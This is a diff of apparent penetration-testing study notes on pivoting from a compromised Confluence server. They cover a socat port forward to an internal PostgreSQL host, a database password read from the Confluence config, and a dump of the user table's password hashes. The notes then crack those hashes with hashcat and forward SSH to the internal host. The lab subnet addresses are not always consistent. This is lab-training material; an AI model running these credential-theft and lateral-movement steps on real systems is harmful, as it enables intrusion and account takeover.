@@ -7,7 +7,7 @@
 ![[rinetd.png]]
 
 
-# Port Forwarding w/ socat
+# Port Forwarding
 
 #### Scenario
 During an assessment, we discover a Linux web server (CONFLUENCE01) running a vulnerable version of Confluence.
@@ -54,8 +54,200 @@ Although it's not always the case, for _this_ particular exploit, this turns out
 - This means we can't apply URL encoding across the whole payload once we've modified it.
 
 
-  
-### RINETD:.
+## [Socat](Tools.md#socat)
+
+> Socat isn't typically installed by default on \*NIX systems.  It's possible to download and run a statically-linked binary version instead
+
+- After enumerating `ip addr` & `ip route`, we discover two subnets
+	- 192.168.247.63/24
+	- 10.4.247.63/24
+- Display routing table
+```bash
+confluence@confluence01:/opt/atlassian/confluence/bin$ routel
+	/usr/bin/routel: 48: shift: can''t shift that many
+	         target            gateway          source    proto    scope    dev tbl
+	        default    192.168.153.254                   static          ens192 
+	    10.4.153.0/ 24                     10.4.153.63   kernel     link ens224             #<NOTE new address
+	 192.168.153.0/ 24                  192.168.153.63   kernel     link ens192 
+	     10.4.153.0          broadcast     10.4.153.63   kernel     link ens224 local
+	    10.4.153.63              local     10.4.153.63   kernel     host ens224 local
+	   10.4.153.255          broadcast     10.4.153.63   kernel     link ens224 local
+	      127.0.0.0          broadcast       127.0.0.1   kernel     link     lo local
+	     127.0.0.0/ 8            local       127.0.0.1   kernel     host     lo local
+	      127.0.0.1              local       127.0.0.1   kernel     host     lo local
+	127.255.255.255          broadcast       127.0.0.1   kernel     link     lo local
+	  192.168.153.0          broadcast  192.168.153.63   kernel     link ens192 local
+	 192.168.153.63              local  192.168.153.63   kernel     host ens192 local
+	192.168.153.255          broadcast  192.168.153.63   kernel     link ens192 local
+	            ::1                                      kernel              lo 
+	            ::1              local                   kernel              lo local
+```
+
+- Knowing it's a Confluence server, check the configuration file
+```bash
+confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
+	<sian/application-data/confluence/confluence.cfg.xml   
+	<?xml version="1.0" encoding="UTF-8"?>
+	
+	<confluence-configuration>
+	  <setupStep>complete</setupStep>
+	  <setupType>custom</setupType>
+	  <buildNumber>8703</buildNumber>
+	  <properties>
+	...
+	    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>                           #<-- NOTE password
+	    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>    #<-- NOTE address/ port
+	    <property name="hibernate.connection.username">postgres</property>                                    #<-- NOTE username
+	...
+	  </properties>
+	</confluence-configuration>
+```
+
+- CONFLUENCE01 (192.168.247.63) is listening on port 8090
+- PGDATABASE01 (10.4.247.215) is listening on port 5432 - (PostgreSQL server's default port)
+
+How it should work:
+- Open port 2345 on WAN interface of CONFLUENCE01 & connect to via Kali
+- All packets sent to 2345 get forwarded by CONFLUENCE01 to port 5432 on PGDATABASE01
+- Connecting to port 2345 on CONFLUENCE01 should be exactly like connecting directly to port 5432 on PGDATABASE01
+
+![](port_forward_scenario.png)
+
+- On CONFLUENCE01
+```bash
+	socat -ddd TCP-LISTEN:2345, fork TCP:10.4.247.215:5432 &
+```
+	-ddd - verbose
+	TCP-LISTEN:2345 - Listener on port 2345
+	fork - Fork into a new subprocess when it receives a connection instead of dying after a single connection
+	TCP:10.4.5.215:5432 - Forward all traffic received to port 5432 on PGDATABASE01
+
+- On Kali, use the [psql](Tools.md#psql) tool to interact with the PostgreSQL database
+```bash
+psql -h 192.168.247.63 -p 2345 -U postgres
+	Password for user postgres: 
+	psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
+	SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+	Type "help" for help.
+	
+	postgres=#
+```
+	psql - Start a terminal-based front-end to PostgreSQL session
+	-h 192.168.50.63 -p 2345 - Connect to CONFLUENCE01 on port 2345
+	-U postgres - Use the *postgres* user account
+
+
+
+Once prompted, enter the password discovered previously and run:
+- `\l` command to list the available databases
+- `\c confluence` command to work with the confluence database
+- `\dt` command to display tables (if necessary)
+- `select * from cwd_user;` command to dump the user table
+
+```postgresql
+ postgres=# \l
+										List of databases
+	    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
+	------------+----------+----------+-------------+-------------+-----------------------
+	 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
+	 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
+	 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+	            |          |          |             |             | postgres=CTc/postgres
+	 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+	            |          |          |             |             | postgres=CTc/postgres
+	(4 rows)
+
+postgres=# \c confluence
+	psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
+	SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+	You are now connected to database "confluence" as user "postgres".
+
+confluence=# select * from cwd_user;
+
+	   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
+	---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
+	  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
+	 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
+	 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
+	 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
+	 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
+	 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
+	(6 rows)
+	
+	(END)
+```
+
+
+
+- We can then save the hashes `{PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC` to a text file and crack with **hashcat**
+```bash
+hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
+	hashcat (v6.2.5) starting
+	
+	OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+	=====================================================================================================================================
+	* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU. 
+	
+	Minimum password length supported by kernel: 0
+	Maximum password length supported by kernel: 256
+	
+	...
+	
+	{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
+	{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
+	{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
+	...
+```
+
+
+> Record all passwords for use later as they may have been reused.
+
+
+- After further enumeration, we'll find PGDATABASE01 is also running an SSH server
+```bash
+nc -zv 10.4.247.63 1-1024 2>&1 | grep succeeded 
+	Connection to 10.4.247.63 22 port [tcp/ssh] succeeded!
+```
+
+Will now need to create a port forward on CONFLUENCE01 which will allow ourselves to directly SSH into PGDATABASE01
+- \*\*NOTE:  Will only work if you add ` &` to end of original socat command.  Otherwise, will be stuck w/in the command and attempting Ctrl+C will cancel your nc session!
+```bash
+# Kill original socat process
+ps aux | grep socat
+	conflue+    3157  0.0  0.0   6968  1772 ?        S    00:40   0:00 socat TCP-LISTEN:2345,fork TCP:10.4.153.247:5432
+	conflue+    3225  0.0  0.0   6432   656 ?        S    00:42   0:00 grep socat
+
+kill -9 3157
+
+# Create socat tunnel to SSH server
+socat TCP-LISTEN:2222,fork TCP:10.4.247.215:22
+
+# In Kali, SSH in
+ssh database_admin@192.168.247.63 -p 2222
+```
+
+
+# SSH Tunneling
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+### RINETD:
 
 
 Port forwarding tool that'll redirect traffic. Helps w/ data transfer  
